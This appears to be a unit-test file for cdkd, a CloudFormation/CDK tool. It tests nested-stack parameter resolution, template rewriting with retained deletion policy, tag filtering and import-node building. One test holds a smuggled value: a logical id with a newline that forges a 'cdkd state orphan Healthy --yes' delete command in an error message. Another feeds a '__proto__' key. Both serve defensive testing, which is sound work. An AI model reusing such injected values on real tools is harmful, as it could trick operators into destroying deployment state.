            new Map([
              [
                'Middle',
                treeNode('Root~Middle', new Map([['Leaf', treeNode('Root~Middle~Leaf', new Map())]])),
              ],
            ])
          ),
          resolver,
          readSsmParameter: read,
        });

      it('resolves its OWN SSM-typed Parameter for its child, and is itself submitted the name', async () => {
        const read = vi.fn(async (name: string) => ({ value: `value-of:${name}`, type: 'String' }));
        const { paramsByCdkdName } = await threeLevel(
          'AWS::SSM::Parameter::Value<String>',
          { MidParam: '/mid/name' },
          read
        );
        expect(read.mock.calls).toEqual([['/mid/name']]);
        expect(paramsByCdkdName.get('Root~Middle')).toEqual([
          { ParameterKey: 'MidParam', ParameterValue: '/mid/name' },
        ]);
        expect(paramsByCdkdName.get('Root~Middle~Leaf')).toEqual([
          { ParameterKey: 'LeafParam', ParameterValue: 'value-of:/mid/name' },
        ]);
      });

      it('passes a root value on through a String Parameter without reading it again', async () => {
        const read = vi.fn(async (name: string) => ({ value: `value-of:${name}`, type: 'String' }));
        const { paramsByCdkdName } = await threeLevel('String', { MidParam: { Ref: 'RootRole' } }, read);
        expect(read.mock.calls).toEqual([['/app/role-name']]);
        expect(paramsByCdkdName.get('Root~Middle~Leaf')).toEqual([
          { ParameterKey: 'LeafParam', ParameterValue: 'value-of:/app/role-name' },
        ]);
      });

      it('names no --parameter remedy for a middle stack, which --parameter cannot bind', async () => {
        const read = vi.fn(async () => {
          throw Object.assign(new Error('x'), { name: 'ParameterNotFound' });
        });
        const err = (await threeLevel(
          'AWS::SSM::Parameter::Value<String>',
          { MidParam: '/mid/name' },
          read
        ).catch((e: unknown) => e)) as Error;
        expect(err.message).toContain('read failed (ParameterNotFound)');
        expect(err.message).toContain('change the name the parent row passes');
        expect(err.message).not.toContain('--parameter');
      });
    });

    it('refuses a SecureString without rendering its value', async () => {
      const read = vi.fn(async () => ({ value: 'ciphertext-3915', type: 'SecureString' }));
      const err = (await run(
        rootWith('AWS::SSM::Parameter::Value<String>', { RoleParam: { Ref: 'RootRole' } }),
        read
      ).catch((e: unknown) => e)) as Error;
      expect(err.message).toContain('It is a SecureString');
      expect(err.message).not.toContain('ciphertext-3915');
    });
  });

  it("reads a parent parameter named '__proto__' as an own key (go-to-k/cdkd#3916)", async () => {
    // On a `{}` bag, assigning `__proto__` sets the PROTOTYPE, so the child's
    // Ref would miss and the parameter would be skipped.
    const rootTemplate = JSON.parse(
      '{"Parameters":{"__proto__":{"Type":"String"}},"Resources":{"Child":{"Type":"AWS::CloudFormation::Stack","Properties":{"Parameters":{"Stage":{"Ref":"__proto__"}}}}}}'
    ) as Record<string, unknown>;
    const tree = treeNode('Root', new Map([['Child', treeNode('Root~Child', new Map())]]));
    const { paramsByCdkdName, intrinsicSkippedByCdkdName } = await buildResolvedParametersPerStack({
      rootStackName: 'Root',
      rootParameters: [{ ParameterKey: '__proto__', ParameterValue: 'prod' }],
      perStackNodes: [
        node('Root', rootTemplate),
        node('Root~Child', { Resources: {} }, { stack: 'Root', logicalId: 'Child' }),
      ],
      tree,
      resolver,
    });
    expect(paramsByCdkdName.get('Root~Child')).toEqual([{ ParameterKey: 'Stage', ParameterValue: 'prod' }]);
    expect(intrinsicSkippedByCdkdName.get('Root~Child')).toBeUndefined();
  });

  it('records unresolvable Parameters in intrinsicSkippedByCdkdName', async () => {
    const rootTemplate = {
      Resources: {
        Child: {
          Type: 'AWS::CloudFormation::Stack',
          Properties: { Parameters: { Bad: { Ref: 'MissingParam' } } },
        },
      },
    };
    const tree = treeNode('Root', new Map([['Child', treeNode('Root~Child', new Map())]]));
    const { paramsByCdkdName, intrinsicSkippedByCdkdName } = await buildResolvedParametersPerStack({
      rootStackName: 'Root',
      rootParameters: [],
      perStackNodes: [
        node('Root', rootTemplate),
        node('Root~Child', { Resources: {} }, { stack: 'Root', logicalId: 'Child' }),
      ],
      tree,
      resolver,
    });
    expect(paramsByCdkdName.get('Root~Child')).toEqual([]);
    expect(intrinsicSkippedByCdkdName.get('Root~Child')).toEqual(['Bad']);
  });
});

describe('injectRetainAndRewriteTemplateUrl (issue #464 PR B2)', () => {
  it('adds DeletionPolicy: Retain on a row that has no DeletionPolicy', () => {
    const row = { Type: 'AWS::CloudFormation::Stack', Properties: { TemplateURL: 'old' } };
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url');
    expect(result['DeletionPolicy']).toBe('Retain');
  });

  it('overwrites any existing DeletionPolicy with Retain', () => {
    const row = {
      Type: 'AWS::CloudFormation::Stack',
      Properties: { TemplateURL: 'old' },
      DeletionPolicy: 'Delete',
    };
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url');
    expect(result['DeletionPolicy']).toBe('Retain');
  });

  it('rewrites Properties.TemplateURL to the new value', () => {
    const row = { Type: 'AWS::CloudFormation::Stack', Properties: { TemplateURL: 'old' } };
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url');
    const props = result['Properties'] as { TemplateURL: string };
    expect(props.TemplateURL).toBe('https://new.url');
  });

  it('preserves other Properties (Parameters, Tags, NotificationARNs)', () => {
    const row = {
      Type: 'AWS::CloudFormation::Stack',
      Properties: {
        TemplateURL: 'old',
        Parameters: { Env: 'prod' },
        Tags: [{ Key: 'k', Value: 'v' }],
        NotificationARNs: ['arn:aws:sns:...'],
      },
    };
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url');
    const props = result['Properties'] as Record<string, unknown>;
    expect(props['Parameters']).toEqual({ Env: 'prod' });
    expect(props['Tags']).toEqual([{ Key: 'k', Value: 'v' }]);
    expect(props['NotificationARNs']).toEqual(['arn:aws:sns:...']);
  });

  it('does NOT mutate the input row (returns a new object)', () => {
    const row = { Type: 'AWS::CloudFormation::Stack', Properties: { TemplateURL: 'old' } };
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url');
    expect(result).not.toBe(row);
    expect((row['Properties'] as { TemplateURL: string }).TemplateURL).toBe('old');
    expect((row as Record<string, unknown>)['DeletionPolicy']).toBeUndefined();
  });

  it('handles missing Properties (synthesizes the field)', () => {
    const row = { Type: 'AWS::CloudFormation::Stack' };
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url');
    const props = result['Properties'] as { TemplateURL: string };
    expect(props.TemplateURL).toBe('https://new.url');
    expect(result['DeletionPolicy']).toBe('Retain');
  });

  it('forwards child-actual Tags into Properties.Tags when supplied', () => {
    const row = { Type: 'AWS::CloudFormation::Stack', Properties: { TemplateURL: 'old' } };
    const childTags = [
      { Key: 'env', Value: 'prod' },
      { Key: 'cdkd:nested-export-flip', Value: '2026-05-24T10:00:00Z' },
    ];
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url', childTags);
    const props = result['Properties'] as { Tags: Array<{ Key: string; Value: string }> };
    // Tags must match the child stack's actual tags verbatim — AWS's
    // "Nested stack import validation" validates the full list against
    // the child stack's current Tags.
    expect(props.Tags).toEqual([
      { Key: 'env', Value: 'prod' },
      { Key: 'cdkd:nested-export-flip', Value: '2026-05-24T10:00:00Z' },
    ]);
  });

  it('omits Properties.Tags when child has no actual tags', () => {
    const row = { Type: 'AWS::CloudFormation::Stack', Properties: { TemplateURL: 'old' } };
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url', []);
    const props = result['Properties'] as Record<string, unknown>;
    expect(props['Tags']).toBeUndefined();
  });

  it('filters out tags with undefined Key or Value (defensive against SDK type laxity)', () => {
    const row = { Type: 'AWS::CloudFormation::Stack', Properties: { TemplateURL: 'old' } };
    const childTags = [
      { Key: 'env', Value: 'prod' },
      { Key: undefined, Value: 'orphan-value' },
      { Key: 'orphan-key', Value: undefined },
      { Key: 'another', Value: 'ok' },
    ];
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url', childTags);
    const props = result['Properties'] as { Tags: Array<{ Key: string; Value: string }> };
    expect(props.Tags).toEqual([
      { Key: 'env', Value: 'prod' },
      { Key: 'another', Value: 'ok' },
    ]);
  });

  it("filters out AWS-system-reserved `aws:`-prefixed tags (CFn rejects user-supplied aws: tags)", () => {
    // DescribeStacks on a stack deployed by AWS Service Catalog or
    // StackSets returns `aws:cloudformation:stack-id` /
    // `aws:cloudformation:stack-name` / etc. as part of the Tags
    // collection. Forwarding those verbatim into the parent template
    // breaks Phase 1B with "Tags starting with 'aws:' are reserved";
    // the helper must filter them out.
    const row = { Type: 'AWS::CloudFormation::Stack', Properties: { TemplateURL: 'old' } };
    const childTags = [
      { Key: 'env', Value: 'prod' },
      { Key: 'aws:cloudformation:stack-id', Value: 'arn:aws:cloudformation:...' },
      { Key: 'aws:cloudformation:stack-name', Value: 'MyStack' },
      { Key: 'team', Value: 'platform' },
    ];
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url', childTags);
    const props = result['Properties'] as { Tags: Array<{ Key: string; Value: string }> };
    expect(props.Tags).toEqual([
      { Key: 'env', Value: 'prod' },
      { Key: 'team', Value: 'platform' },
    ]);
  });

  it('omits Properties.Tags entirely when child has only `aws:` system tags (no user tags survive the filter)', () => {
    const row = { Type: 'AWS::CloudFormation::Stack', Properties: { TemplateURL: 'old' } };
    const childTags = [
      { Key: 'aws:cloudformation:stack-id', Value: 'arn:aws:cloudformation:...' },
      { Key: 'aws:cloudformation:stack-name', Value: 'MyStack' },
    ];
    const result = injectRetainAndRewriteTemplateUrl(row, 'https://new.url', childTags);
    const props = result['Properties'] as Record<string, unknown>;
    expect(props['Tags']).toBeUndefined();
  });
});

describe('buildPerStackImportNodes (issue #464 PR B2)', () => {
  // The helper takes a CdkdStateStackTree (loaded via buildCdkdStateStackTree)
  // plus the root template + per-logical-id absolute paths to nested-child
  // templates and recursively reads each child template from disk. We use a
  // real tmpdir so `readNestedChildTemplateFile`'s I/O path runs unmocked.
  let tmpRoot: string;
  beforeEach(async () => {
    const { mkdtempSync, writeFileSync } = await import('node:fs');
    const { tmpdir } = await import('node:os');
    const { join } = await import('node:path');
    tmpRoot = mkdtempSync(join(tmpdir(), 'cdkd-export-pernode-test-'));
    // Helper for tests to write child / grandchild template fixtures.
    (globalThis as Record<string, unknown>)['__writeFixtureForBuildPerStackImportNodesTest'] = (
      relPath: string,
      content: Record<string, unknown>
    ): string => {
      const abs = join(tmpRoot, relPath);
      writeFileSync(abs, JSON.stringify(content), 'utf-8');
      return abs;
    };
  });
  afterEach(async () => {
    const { rmSync } = await import('node:fs');
    rmSync(tmpRoot, { recursive: true, force: true });
    delete (globalThis as Record<string, unknown>)['__writeFixtureForBuildPerStackImportNodesTest'];
  });

  function fixturePath(relPath: string, content: Record<string, unknown>): string {
    return (
      globalThis as unknown as Record<
        string,
        (relPath: string, content: Record<string, unknown>) => string
      >
    )['__writeFixtureForBuildPerStackImportNodesTest']!(relPath, content);
  }

  it('returns a single entry for a leaf-only tree', () => {
    const tree: CdkdStateStackTree = {
      stackName: 'Root',
      region: 'us-east-1',
      state: makeState({ stackName: 'Root', region: 'us-east-1' }),
      nestedChildren: new Map(),
    };
    const rootTemplate = { Resources: { Bucket: { Type: 'AWS::S3::Bucket' } } };
    const nodes = buildPerStackImportNodes('Root', rootTemplate, {}, 'json', tree);
    expect(nodes.size).toBe(1);
    expect(nodes.get('Root')!.template).toBe(rootTemplate);
    expect(nodes.get('Root')!.templateFormat).toBe('json');
  });

  it('never renders a record-derived name RAW in the missing-asset-path refusal (go-to-k/cdkd#3328)', () => {
    // The second of the three sites that suggested `cdkd state orphan <name>`
    // built from `${parent}~${logicalId}`. This one rendered the name with no
    // sanitizing at all, so a newline in a logical id forged whole lines
    // around a DELETE command, and the CSI sequence below could rewrite them.
    const hostile = 'Child\n  cdkd state orphan Healthy --yes';
    const tree: CdkdStateStackTree = {
      stackName: 'Root',
      region: 'us-east-1',
      state: makeState({
        stackName: 'Root',
        region: 'us-east-1',
        resources: { [hostile]: { resourceType: 'AWS::CloudFormation::Stack' } },
      }),
      nestedChildren: new Map([
        [
          hostile,
          {
            stackName: `Root~${hostile}`,
            region: 'us-east-1',
            state: makeState({ stackName: `Root~${hostile}`, region: 'us-east-1' }),
            nestedChildren: new Map(),
          },
        ],
      ]),
    };
    const rootTemplate = {
      Resources: { [hostile]: { Type: 'AWS::CloudFormation::Stack' } },
    };

    // No path index entry for the child, so the refusal fires.
    const thrown = (() => {
      try {
        buildPerStackImportNodes('Root', rootTemplate, {}, 'json', tree);
        return undefined;
      } catch (e: unknown) {
        return e;
      }
    })();

    const message = (thrown as Error).message;
    expect(message).toContain("no Metadata['aws:asset:path']");
    // No line of the refusal may BE a runnable delete, which is what the raw
    // newline bought.
    expect(
      message.split('\n').some((line) => line.trim().startsWith('cdkd state orphan Healthy'))
    ).toBe(false);
    // And the suggested command is withheld, because the name does not render
    // exactly once sanitized — LAST, on a labelled line of its own, with the
    // gate's reason in the sentence before it (go-to-k/cdkd#3436).
    expect(
      message.endsWith("\nRemove it with: cdkd state orphan '<stack>' --stack-region '<region>'")
    ).toBe(true);
    expect(message).toContain(
      "its record's stack name does NOT render exactly (another record may render identically)"
    );
  });

  it('ends the missing-asset-path refusal on a NAMED orphan command, alone on its labelled line (go-to-k/cdkd#3436)', () => {
    const tree: CdkdStateStackTree = {
      stackName: 'Root',
      region: 'us-east-1',
      state: makeState({
        stackName: 'Root',
        region: 'us-east-1',
        resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
      }),
      nestedChildren: new Map([
        [
          'Child',
          {
            stackName: 'Root~Child',
            region: 'us-east-1',
            state: makeState({ stackName: 'Root~Child', region: 'us-east-1' }),
            nestedChildren: new Map(),
          },
        ],
      ]),
    };
    const thrown = (() => {
      try {
        buildPerStackImportNodes(
          'Root',
          { Resources: { Child: { Type: 'AWS::CloudFormation::Stack' } } },
          {},
          'json',
          tree
        );
        return undefined;
      } catch (e: unknown) {
        return e;
      }
    })();
    const message = (thrown as Error).message;
    expect(
      message.endsWith(
        "remove the cdkd state for the orphaned child.\nRemove it with: cdkd state orphan 'Root~Child' --stack-region us-east-1"
      )
    ).toBe(true);
  });

  it('loads a child template via the nested-template path index', () => {
    const childTemplate = { Resources: { Param: { Type: 'AWS::SSM::Parameter' } } };
    const childPath = fixturePath('child.template.json', childTemplate);
    const tree: CdkdStateStackTree = {
      stackName: 'Root',
      region: 'us-east-1',
      state: makeState({
        stackName: 'Root',
        region: 'us-east-1',
        resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
      }),
      nestedChildren: new Map([
        [
          'Child',
          {
            stackName: 'Root~Child',
            region: 'us-east-1',
            state: makeState({
              stackName: 'Root~Child',
              region: 'us-east-1',
              parentStack: 'Root',
              parentLogicalId: 'Child',
            }),
            nestedChildren: new Map(),
          },
        ],
      ]),
    };
    const rootTemplate = {
      Resources: { Child: { Type: 'AWS::CloudFormation::Stack' } },
    };
    const nodes = buildPerStackImportNodes(
      'Root',
      rootTemplate,
      { Child: childPath },
      'json',
      tree
    );
    expect(nodes.size).toBe(2);
    expect(nodes.get('Root~Child')!.template).toEqual(childTemplate);
  });

  it('recurses into grandchildren via the child template Metadata', () => {
    const grandTemplate = { Resources: { Bucket: { Type: 'AWS::S3::Bucket' } } };
    const grandPath = fixturePath('grand.template.json', grandTemplate);
    // The child template references the grand template via aws:asset:path.
    // Path is relative to the CHILD template's directory (so we use the
    // same tmpRoot — both files are siblings).
    const childTemplate = {
      Resources: {
        Grand: {
          Type: 'AWS::CloudFormation::Stack',
          Metadata: { 'aws:asset:path': 'grand.template.json' },
        },
      },
    };
    const childPath = fixturePath('child.template.json', childTemplate);
    const tree: CdkdStateStackTree = {
      stackName: 'Root',
      region: 'us-east-1',
      state: makeState({
        stackName: 'Root',
        region: 'us-east-1',
        resources: { Child: { resourceType: 'AWS::CloudFormation::Stack' } },
      }),
      nestedChildren: new Map([
        [
          'Child',
          {
            stackName: 'Root~Child',
            region: 'us-east-1',
            state: makeState({
              stackName: 'Root~Child',
              region: 'us-east-1',
              resources: { Grand: { resourceType: 'AWS::CloudFormation::Stack' } },
              parentStack: 'Root',
              parentLogicalId: 'Child',
            }),
            nestedChildren: new Map([
              [
                'Grand',
                {
                  stackName: 'Root~Child~Grand',
                  region: 'us-east-1',
                  state: makeState({
                    stackName: 'Root~Child~Grand',
                    region: 'us-east-1',
                    parentStack: 'Root~Child',
                    parentLogicalId: 'Grand',
                  }),
                  nestedChildren: new Map(),
                },
              ],
            ]),
          },
        ],
      ]),
    };
    const rootTemplate = {
      Resources: { Child: { Type: 'AWS::CloudFormation::Stack' } },
    };
    const nodes = buildPerStackImportNodes(
      'Root',
      rootTemplate,
      { Child: childPath },
      'json',
      tree
    );
    expect(nodes.size).toBe(3);
    expect(nodes.get('Root~Child~Grand')!.template).toEqual(grandTemplate);
  });

  it('throws when a child has cdkd state but no nested-template path on the parent', () => {
    const tree: CdkdStateStackTree = {
      stackName: 'Root',
      region: 'us-east-1',
      state: makeState({ stackName: 'Root', region: 'us-east-1' }),
      nestedChildren: new Map([
        [
          'Child',
          {
            stackName: 'Root~Child',
            region: 'us-east-1',
            state: makeState({ stackName: 'Root~Child', region: 'us-east-1' }),
            nestedChildren: new Map(),
          },
        ],
      ]),
    };
    const rootTemplate = {
      Resources: { Child: { Type: 'AWS::CloudFormation::Stack' } },
    };
    expect(() =>
      buildPerStackImportNodes('Root', rootTemplate, {}, 'json', tree)
    ).toThrow(/no Metadata\['aws:asset:path'\] in the parent template/);
  });

  it('throws when the tree root does not match the supplied rootStackName', () => {
    const tree: CdkdStateStackTree = {
      stackName: 'NotRoot',
      region: 'us-east-1',
      state: makeState({ stackName: 'NotRoot', region: 'us-east-1' }),
      nestedChildren: new Map(),
    };
    expect(() =>
      buildPerStackImportNodes('Root', {}, {}, 'json', tree)
    ).toThrow(/tree root 'NotRoot' does not match expected root stack name 'Root'/);
  });

  // Suppress noisy `runPerStackImportLoop` import — the orchestrator is
  // tested in `export-nested-loop.test.ts`. Reference here keeps the
  // import-list's intent grep-able.
  it('runPerStackImportLoop is exported (orchestrator covered in export-nested-loop.test.ts)', () => {
    expect(typeof runPerStackImportLoop).toBe('function');
  });
});
